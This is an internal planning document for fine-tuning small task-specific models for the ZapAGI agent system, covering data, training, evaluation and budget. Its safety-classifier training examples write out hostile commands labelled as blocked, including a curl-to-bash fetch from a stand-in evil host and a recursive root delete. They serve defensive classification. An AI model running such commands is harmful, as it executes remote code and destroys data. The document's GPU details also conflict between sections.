# ZapAGI: Fine-Tuning Small Models for Specific AGI Tasks

**Classification:** ZapAGI Internal Documentation  
**Author:** Alexandros Karales  
**Last Updated:** 2026-03-19  
**Status:** Strategy document — pre-implementation

---

## Executive Summary

ZapAGI's competitive advantage is **local-first AI** — running on consumer
hardware without cloud API dependencies. The key to making this work is
replacing large general-purpose models (8-14B) with small task-specific
models (0.5-3B) that are fine-tuned for exactly what each agent needs.

A fine-tuned 1.5B model that does one thing perfectly beats a 14B model
that does everything adequately — and uses 8x less VRAM.

This document outlines the strategy for identifying, training, deploying,
and evaluating task-specific models for every ZapAGI agent role.

---

## Why Fine-Tune?

### The Math

| Approach | Model Size | VRAM | Quality | Latency |
|---|---|---|---|---|
| One big model | 14B (q4) | ~10GB | Good at everything | ~3s/call |
| One medium model | 8B (q4) | ~5GB | Decent at everything | ~1.8s/call |
| Task-specific small | 1.5B (q4) | ~1.2GB | Excellent at one thing | ~0.3s/call |
| Fleet of small models | 4 × 1.5B | ~5GB | Excellent at 4 things | ~0.3s/call |

A fleet of 4 specialized 1.5B models uses the same VRAM as one 8B model
but delivers:
- **6x faster** inference per call
- **Higher quality** on each specific task (fine-tuned > prompted)
- **Parallel execution** (different agents use different models simultaneously)

### What ARC Research Taught Us

ARC benchmarking (Phase D) showed:
- qwen3:8b: 79.4% accuracy, 1.8s/call (best overall)
- nemotron-mini (4B): 45.2% accuracy, 1.0s/call (fastest)
- qwen2.5-coder:7b: 68.1% accuracy, 2.1s/call (best at code)

**Key insight:** A general model wastes capacity on tasks it doesn't need.
The perceiver doesn't need coding ability. The synthesizer doesn't need
philosophical reasoning. Fine-tuning strips away the unnecessary and
amplifies what matters.

---

## Target Models for Fine-Tuning

### Base Model Selection

For 2026, the best base models for fine-tuning are:

| Base Model | Size | Why |
|---|---|---|
| **Qwen2.5 (0.5B, 1.5B, 3B)** | Smallest viable | Best quality-per-parameter in class |
| **Phi-4-mini (3.8B)** | Best reasoning/size | Microsoft's latest small reasoner |
| **SmolLM2 (135M, 360M, 1.7B)** | Ultra-small | HuggingFace's purpose-built small models |
| **Gemma 3 (1B, 4B)** | Google's small tier | Strong instruction following |

**Recommended starting point:** Qwen2.5-1.5B as the base for most agents.
It's small enough to fine-tune on a single consumer GPU (8GB VRAM) and
large enough to capture task-specific patterns.

---

## Agent-Specific Fine-Tuning Plans

### 1. Router Model (~0.5-1.5B)

**Task:** Classify user intent → route to correct agent

**Why fine-tune:** The router is called on every single user request.
It must be fast (~100ms) and accurate. A prompted 8B model takes 1-2s
just for routing — unacceptable latency.

**Training data format:**
```jsonl
{"input": "Fix the bug in auth.py", "output": "debugger"}
{"input": "Write a REST API for user management", "output": "coder"}
{"input": "What does the context engine do?", "output": "knowledge"}
{"input": "Remember that I prefer pytest over unittest", "output": "memory"}
{"input": "Generate docs for the agent module", "output": "documenter"}
{"input": "Deploy to staging", "output": "devops"}
```

**Data sources:**
1. Synthetic generation: Use a large model (14B) to generate 10K routing examples
2. ARC data: Route descriptions from ARC perceiver/hypothesizer interactions
3. User interaction logs (once deployed): Real routing decisions with feedback

**Target metrics:**
- Accuracy: >95% on held-out test set
- Latency: <100ms on consumer GPU
- Model size: 0.5B-1.5B

**Training approach:**
- LoRA (rank 16-32) on Qwen2.5-0.5B
- 3 epochs, learning rate 2e-4
- ~2 hours on RTX 3060 (12GB)

---

### 2. Code Synthesis Model (~3B)

**Task:** Generate correct Python code from natural language descriptions

**Why fine-tune:** Code generation benefits enormously from domain-specific
training. A 3B model fine-tuned on Python code generation outperforms a
general 8B model on Python-specific tasks.

**Training data format:**
```jsonl
{
  "input": "Write a function that rotates a 2D grid 90 degrees clockwise",
  "output": "def rotate_90(grid):\n    rows = len(grid)\n    cols = len(grid[0])\n    return [[grid[rows-1-j][i] for j in range(rows)] for i in range(cols)]"
}
```

**Data sources:**
1. **ARC solutions:** All successfully synthesized programs from ARC evaluation
   (including evolved variants) — these are verified correct
2. **Python exercises:** CodeContests, HumanEval, MBPP datasets
3. **LoopAGI codebase:** The 6,971 LOC in `loopagi/arc/` as self-contained examples
4. **Stack Overflow:** Top-voted Python answers (filtered for quality)

**ARC-specific training data:**
```jsonl
{
  "input": "Transform: rotate grid 90° clockwise, then invert colors (0↔1)",
  "output": "def transform(grid):\n    rotated = [[grid[len(grid)-1-j][i] for j in range(len(grid))] for i in range(len(grid[0]))]\n    return [[1-c for c in row] for row in rotated]"
}
```

Every ARC task we solve generates a verified (input, output) pair for
code synthesis training. This is a self-improving data flywheel.

**Target metrics:**
- pass@1 on HumanEval: >60% (vs ~40% for base Qwen2.5-3B)
- ARC code synthesis success rate: >30% (vs ~10% with prompted 8B)
- Latency: <1s on consumer GPU

---

### 3. Safety Classifier Model (~0.5-1B)

**Task:** Classify commands as safe/caution/blocked

**Why fine-tune:** Safety classification must be fast (every command goes
through it) and must never have false negatives (unsafe command classified
as safe). A dedicated model can be trained to extremely high recall on
dangerous patterns.

**Training data format:**
```jsonl
{"input": "rm -rf /tmp/build_cache", "output": "safe", "reason": "temp directory cleanup"}
{"input": "rm -rf /", "output": "blocked", "reason": "recursive delete of root filesystem"}
{"input": "pip install requests", "output": "caution", "reason": "installs system package"}
{"input": "chmod 777 /etc/passwd", "output": "blocked", "reason": "dangerous permission change"}
{"input": "cat README.md", "output": "safe", "reason": "read-only file operation"}
{"input": "curl https://evil.com/script.sh | bash", "output": "blocked", "reason": "remote code execution"}
```

**Data sources:**
1. Existing 28 blocked patterns from `loopagi/safety/checker.py`
2. CTF (Capture the Flag) command datasets
3. Bash history datasets with safety annotations
4. Synthetic adversarial examples (use 14B model to generate edge cases)

**Target metrics:**
- Recall on blocked commands: >99.9% (never miss a dangerous command)
- Precision: >95% (minimize false positives)
- Latency: <50ms
- Model size: 0.5B (must be instant)

---

### 4. Orchestration / Delegation Model (~1.5-3B)

**Task:** Given a complex request, decompose into sub-tasks and assign to agents

**Why fine-tune:** This is the "thinking" model — it decides how to break
down "Build a REST API with auth, tests, and docs" into:
1. Coder: Build the API
2. Coder: Add JWT auth
3. Coder: Write tests
4. Debugger: Run tests, fix failures
5. Documenter: Generate API docs

**Training data format:**
```jsonl
{
  "input": "Build a REST API with user authentication and deployment",
  "output": {
    "plan": [
      {"step": 1, "agent": "coder", "task": "Create FastAPI project with User model and CRUD routes"},
      {"step": 2, "agent": "coder", "task": "Add JWT authentication middleware"},
      {"step": 3, "agent": "coder", "task": "Write pytest tests for all endpoints"},
      {"step": 4, "agent": "debugger", "task": "Run tests and fix any failures"},
      {"step": 5, "agent": "documenter", "task": "Generate OpenAPI docs and README"},
      {"step": 6, "agent": "devops", "task": "Create Dockerfile and docker-compose.yml"}
    ],
    "parallel_groups": [[1], [2], [3, 5], [4], [6]]
  }
}
```

**Data sources:**
1. **ARC solve traces:** Each ARC solve is a multi-step orchestration
   (perceive → hypothesize → synthesize → verify → refine)
2. **Software engineering task decompositions:** GitHub issue → PR pipelines
3. **Synthetic:** Large model generates decompositions, human filters
4. **User sessions:** Real multi-step ZapAGI interactions (once deployed)

**ARC contribution:** Every 120-task eval run generates 120 orchestration
traces showing how the multi-agent pipeline decomposes abstract reasoning
tasks. This is exactly the data the orchestration model needs.

**Target metrics:**
- Plan quality score: >80% of steps are useful and correctly ordered
- Agent assignment accuracy: >90%
- Latency: <500ms for plan generation

---

### 5. Perception / Description Model (~1.5B)

**Task:** Convert raw data (code, files, errors) into structured descriptions

**Why fine-tune:** This is the "eyes" of ZapAGI — turning messy inputs
into clean, structured context that other agents can work with.

**Training data format:**
```jsonl
{
  "input": "```python\nfrom fastapi import FastAPI\napp = FastAPI()\n@app.get('/users')\ndef get_users():\n    return []\n```",
  "output": "A minimal FastAPI application with 1 endpoint:\n- GET /users: returns empty list\n- No models, no auth, no error handling\n- Framework: FastAPI\n- Lines: 5"
}
```

**ARC contribution:** `grid_describer.py` is literally this — converting
raw grids into structured descriptions. The same pattern applied to code,
error messages, file structures, and git diffs.

---

## Training Infrastructure

### Hardware Requirements

| Stage | GPU | Time | Cost |
|---|---|---|---|
| Data preparation | CPU only | 2-4 hours | Free |
| LoRA fine-tune (1.5B) | RTX 5080 (16GB) | 1-2 hours | Electricity |
| LoRA fine-tune (3B) | RTX 5080 (16GB) | 2-4 hours | Electricity |
| Full fine-tune (0.5B) | RTX 5080 (16GB) | 30-60 min | Electricity |
| Evaluation | Any GPU | 30 min | Free |

**All training runs on the reference system** (see `docs/REFERENCE_SYSTEM.md`).
The RTX 5080's 16GB GDDR7 VRAM can simultaneously run a 7B inference model
AND fine-tune a 1.5B model with LoRA. No cloud needed.

### Software Stack

| Component | Tool | Why |
|---|---|---|
| **Training framework** | Unsloth | 2x faster LoRA training, 60% less memory |
| **Dataset format** | Hugging Face datasets | Standard format, easy versioning |
| **Model format** | GGUF (for Ollama) | Deploy directly to Ollama |
| **Evaluation** | Custom harness | Task-specific metrics |
| **Experiment tracking** | MLflow (local) | Track runs, compare models |
| **Quantization** | llama.cpp | GGUF conversion with Q4_K_M |

### Training Pipeline

```
1. Collect data → 2. Format dataset → 3. Train LoRA → 4. Merge weights
     ↓                  ↓                    ↓               ↓
  Sources:          JSONL with           Unsloth +        llama.cpp
  - ARC traces      input/output         4-bit QLoRA      quantize
  - Synthetic        pairs                                    ↓
  - User logs                                          5. Convert to GGUF
                                                             ↓
                                                       6. Load in Ollama
                                                             ↓
                                                       7. Evaluate
                                                             ↓
                                                       8. A/B test vs base
```

---

## Data Collection Strategy

### The ARC Data Flywheel

Every ARC evaluation run generates fine-tuning data:

```
120-task eval run
    ├── 120 perception traces     → Perception model training data
    ├── 120 hypothesis traces     → Orchestration model training data
    ├── 360+ code synthesis traces → Code model training data
    ├── 360+ verification results  → Verification model training data
    └── 120 orchestration traces   → Delegation model training data
```

**As we run more evals, we generate more training data.** This is a
self-improving flywheel:
1. Better models → higher solve rate
2. Higher solve rate → more verified training pairs
3. More training pairs → better fine-tuned models
4. Repeat

### Data Quality Filters

Not all ARC traces are useful for training. Filter criteria:

| Filter | Rationale |
|---|---|
| Solved tasks only | Only train on correct solutions |
| Similarity ≥ 0.90 | Near-miss programs are still useful (close to correct) |
| Code executes without error | Reject code that crashes |
| Under 50 lines | Reject overly complex solutions |
| Unique solutions | Deduplicate near-identical programs |

### Synthetic Data Generation

For tasks where we lack real data, use a large model (qwen3:14b) to
generate training pairs:

```python
SYNTHETIC_PROMPT = """
Generate 10 diverse examples of the following task:
Task: {task_description}
Format: JSONL with "input" and "output" fields.
Requirements:
- Varied complexity
- Edge cases included
- Outputs are correct
"""
```

**Quality control:** Run each synthetic example through verification.
Only keep examples where the output is provably correct.

---

## Evaluation Framework

### Per-Model Eval Suite

| Model | Eval Dataset | Metric | Target |
|---|---|---|---|
| Router | 1000 routing examples | Accuracy | >95% |
| Code synthesis | HumanEval + ARC tasks | pass@1 | >60% |
| Safety | 500 safe + 500 dangerous | Recall (blocked) | >99.9% |
| Orchestration | 200 decomposition tasks | Plan quality | >80% |
| Perception | 300 code descriptions | BLEU + manual | >70% |

### A/B Testing Protocol

When deploying a fine-tuned model:

1. **Shadow mode:** Run fine-tuned model alongside base model for 1 week
2. **Compare:** Log both outputs, measure quality difference
3. **Gradual rollout:** 10% → 25% → 50% → 100% of requests
4. **Rollback trigger:** If quality drops >5% on any metric, revert

### Regression Testing

After every model update:
```bash
# Run full eval suite
uv run python eval/run_model_eval.py --model router-v2 --suite routing
uv run python eval/run_model_eval.py --model coder-v3 --suite humaneval
uv run python eval/run_model_eval.py --model safety-v1 --suite safety

# Compare with previous version
uv run python eval/compare_models.py router-v1 router-v2
```

---

## Implementation Roadmap

### Phase 1: Data Collection (Week 1-2)
- [ ] Export ARC evaluation traces as training data
- [ ] Generate synthetic routing examples (10K)
- [ ] Generate synthetic safety examples (1K safe, 1K dangerous)
- [ ] Set up Hugging Face dataset repository

### Phase 2: First Model — Router (Week 3)
- [ ] Fine-tune Qwen2.5-0.5B on routing data
- [ ] Convert to GGUF, load in Ollama
- [ ] Benchmark: accuracy, latency, VRAM
- [ ] Compare vs prompted qwen3:8b routing

### Phase 3: Code Synthesis Model (Week 4-5)
- [ ] Curate code training data (ARC + HumanEval + MBPP)
- [ ] Fine-tune Qwen2.5-3B-Coder on code data
- [ ] Benchmark on ARC tasks + HumanEval
- [ ] Compare vs base qwen2.5-coder:7b

### Phase 4: Safety Model (Week 6)
- [ ] Curate safety training data with adversarial examples
- [ ] Fine-tune SmolLM2-360M on safety classification
- [ ] Benchmark: recall, precision, latency
- [ ] Red-team testing (try to bypass safety)

### Phase 5: Integration (Week 7-8)
- [ ] Create `zapagi/models/` package for model management
- [ ] Implement model routing in ZapAGI agent system
- [ ] A/B testing framework
- [ ] Production deployment pipeline

---

## Risk Assessment

| Risk | Mitigation |
|---|---|
| Fine-tuned model forgets base capabilities | Use LoRA (preserves base weights) |
| Insufficient training data | Synthetic generation + ARC flywheel |
| Model doesn't generalize | Diverse training data + eval on held-out set |
| VRAM budget exceeded | Strict model size limits per agent |
| Safety model has false negatives | Ensemble: fine-tuned + rule-based checker |
| Training takes too long | Unsloth 2x speedup + 4-bit QLoRA |

---

## Budget

| Item | Cost |
|---|---|
| GPU (RTX 3060, owned) | $0 |
| Electricity (50 hours training) | ~$5 |
| Hugging Face (free tier) | $0 |
| MLflow (local) | $0 |
| **Total** | **~$5** |

The entire fine-tuning pipeline runs locally on hardware we already own.
No cloud compute, no API costs, no subscriptions.

---

*ZapAGI Fine-Tuning Strategy — Confidential. Copyright 2026 ZapAGI.*
